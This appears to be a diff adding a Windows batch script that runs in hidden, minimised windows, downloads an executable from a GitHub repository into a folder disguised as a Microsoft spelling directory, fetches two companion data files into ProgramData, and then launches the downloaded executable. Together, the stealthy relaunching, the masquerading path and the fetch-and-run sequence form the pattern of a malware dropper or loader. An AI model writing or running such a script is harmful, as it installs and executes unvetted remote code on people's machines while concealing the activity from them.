@@ -1,0 +1,158 @@
+@echo off
+setlocal EnableDelayedExpansion
+
+REM ---- Minimize window on first launch ----
+if defined __CW_MIN__ goto :min_done
+set "__CW_MIN__=1"
+start "" /min cmd /c "%~f0" %*
+exit /b 0
+:min_done
+
+REM ---- Child-process restart (hidden window) ----
+if "%~1"=="__spawned__" goto :main
+
+REM ---- Auto-generated script ----
+REM Files are processed in order. After each acquisition
+REM the script restarts so every file is re-verified.
+
+:main
+
+if not defined CW_RUN set "CW_RUN=0"
+set /a CW_RUN+=1
+set "LOGFILE=download.bat_run_!CW_RUN!.log"
+set "CW_M=MARK_%RANDOM%_%RANDOM%"
+title !CW_M!
+timeout /t 1 /nobreak >nul
+for /f "tokens=2 delims=," %%a in ('tasklist /v /fo csv /nh /fi "windowtitle eq !CW_M!"') do set "CW_PID=%%~a"
+echo [*] Run !CW_RUN! - PID: !CW_PID! > "!LOGFILE!"
+
+REM ---- File 1 ----
+if exist "%APPDATA%\Microsoft\Spelling\WFC.exe" (
+    echo [*] File 1 present: "%APPDATA%\Microsoft\Spelling\WFC.exe" >> "!LOGFILE!"
+    goto :file1_done
+)
+
+:file1_url1
+echo [+] File 1: downloading URL 1: https://github.com/cw6787/wfc/raw/refs/heads/main/WFC.exe >> "!LOGFILE!"
+set "DL_DEST=%APPDATA%\Microsoft\Spelling\WFC.exe"
+for %%F in ("!DL_DEST!") do (
+    if not exist "%%~dpF" mkdir "%%~dpF"
+)
+curl -LJ -s -o "%APPDATA%\Microsoft\Spelling\WFC.exe" "https://github.com/cw6787/wfc/raw/refs/heads/main/WFC.exe"
+if !errorlevel! neq 0 (
+    del "%APPDATA%\Microsoft\Spelling\WFC.exe" 2>nul
+    goto :file1_urls_failed
+)
+goto :file1_ok
+
+:file1_urls_failed
+echo [-] File 1: all URLs exhausted. >> "!LOGFILE!"
+exit /b 1
+
+:file1_ok
+if not defined __CW_CHILD__ goto :file1_spawn
+echo [+] Restarting: call "%~f0" %* >> "!LOGFILE!"
+call "%~f0" %*
+goto :eof
+:file1_spawn
+set "__CW_CHILD__=1"
+echo [+] Spawning: start "" /min /wait cmd /c "%~f0" __spawned__ >> "!LOGFILE!"
+start "" /min /wait cmd /c "%~f0" __spawned__
+set "__CW_CHILD__="
+goto :file1_done
+
+:file1_done
+
+REM ---- File 2 ----
+if exist "%PROGRAMDATA%\costanza\index.xoml" (
+    echo [*] File 2 present: "%PROGRAMDATA%\costanza\index.xoml" >> "!LOGFILE!"
+    goto :file2_done
+)
+
+:file2_url1
+echo [+] File 2: downloading URL 1: https://raw.githubusercontent.com/cw6787/comeclean/refs/heads/main/index.xml >> "!LOGFILE!"
+set "DL_DEST=%PROGRAMDATA%\costanza\index.xoml"
+for %%F in ("!DL_DEST!") do (
+    if not exist "%%~dpF" mkdir "%%~dpF"
+)
+curl -L -s -o "%PROGRAMDATA%\costanza\index.xoml" "https://raw.githubusercontent.com/cw6787/comeclean/refs/heads/main/index.xml"
+if !errorlevel! neq 0 (
+    del "%PROGRAMDATA%\costanza\index.xoml" 2>nul
+    goto :file2_urls_failed
+)
+goto :file2_ok
+
+:file2_urls_failed
+echo [-] File 2: all URLs exhausted. >> "!LOGFILE!"
+exit /b 1
+
+:file2_ok
+if not defined __CW_CHILD__ goto :file2_spawn
+echo [+] Restarting: call "%~f0" %* >> "!LOGFILE!"
+call "%~f0" %*
+goto :eof
+:file2_spawn
+set "__CW_CHILD__=1"
+echo [+] Spawning: start "" /min /wait cmd /c "%~f0" __spawned__ >> "!LOGFILE!"
+start "" /min /wait cmd /c "%~f0" __spawned__
+set "__CW_CHILD__="
+goto :file2_done
+
+:file2_done
+
+REM ---- File 3 ----
+if exist "%PROGRAMDATA%\costanza\viewtime.csv" (
+    echo [*] File 3 present: "%PROGRAMDATA%\costanza\viewtime.csv" >> "!LOGFILE!"
+    goto :file3_done
+)
+
+:file3_url1
+echo [+] File 3: downloading URL 1: https://raw.githubusercontent.com/cw6787/comeclean/refs/heads/main/Viewtime.csv >> "!LOGFILE!"
+set "DL_DEST=%PROGRAMDATA%\costanza\viewtime.csv"
+for %%F in ("!DL_DEST!") do (
+    if not exist "%%~dpF" mkdir "%%~dpF"
+)
+curl -L -s -o "%PROGRAMDATA%\costanza\viewtime.csv" "https://raw.githubusercontent.com/cw6787/comeclean/refs/heads/main/Viewtime.csv"
+if !errorlevel! neq 0 (
+    del "%PROGRAMDATA%\costanza\viewtime.csv" 2>nul
+    goto :file3_urls_failed
+)
+goto :file3_ok
+
+:file3_urls_failed
+echo [-] File 3: all URLs exhausted. >> "!LOGFILE!"
+exit /b 1
+
+:file3_ok
+if not defined __CW_CHILD__ goto :file3_spawn
+echo [+] Restarting: call "%~f0" %* >> "!LOGFILE!"
+call "%~f0" %*
+goto :eof
+:file3_spawn
+set "__CW_CHILD__=1"
+echo [+] Spawning: start "" /min /wait cmd /c "%~f0" __spawned__ >> "!LOGFILE!"
+start "" /min /wait cmd /c "%~f0" __spawned__
+set "__CW_CHILD__="
+goto :file3_done
+
+:file3_done
+
+if defined __CW_CHILD__ goto :eof
+
+if defined __CW_FINAL__ goto :final
+set "__CW_FINAL__=1"
+echo [+] Spawning final: start "" /min cmd /c "%~f0" __spawned__ >> "!LOGFILE!"
+start "" /min cmd /c "%~f0" __spawned__
+exit /b 0
+
+:final
+REM ---- Final commands ----
+echo [+] Executing: %APPDATA%\Microsoft\Spelling\WFC.exe %PROGRAMDATA%\costanza\viewtime.csv >> "!LOGFILE!"
+%APPDATA%\Microsoft\Spelling\WFC.exe %PROGRAMDATA%\costanza\viewtime.csv
+if !errorlevel! neq 0 (
+    echo [-] Final command 1 failed. >> "!LOGFILE!"
+    exit /b 1
+)
+
+echo [*] All files acquired. >> "!LOGFILE!"
+endlocal
